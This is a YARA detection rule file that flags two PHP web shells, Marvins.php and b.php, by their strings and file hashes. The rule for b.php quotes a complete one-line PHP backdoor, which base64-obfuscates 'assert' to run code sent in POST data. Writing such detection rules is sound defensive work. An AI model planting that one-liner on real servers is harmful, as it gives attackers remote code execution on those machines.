/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-30
   Identifier: shell4
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_30_18_Marvins {
   meta:
      description = "shell4 - file Marvins.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "421afe61a0801906370ba1819dfe7bbedb8dd098398592557de1cfa7f0ae90e6"
   strings:
      $s1 = "if(isset(" fullword ascii
      $s2 = "foreach($scandir" fullword ascii
      $s3 = "if(rmdir(" fullword ascii
      $s4 = "<?php" fullword ascii
      $s7 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
   condition:
       all of them
}

rule infected_09_30_18_shell_b {
   meta:
      description = "shell4 - file b.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "bd1fed42c3a343c198c0478dd5a39c0a7048990eb1b96ea57bd635808a6b4412"
   strings:
      $s1 = "<?php $c=base64_decode('YXNzZXI=').$_GET['n'].'t';@$c($_POST['x']);?>abcabcabc" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}
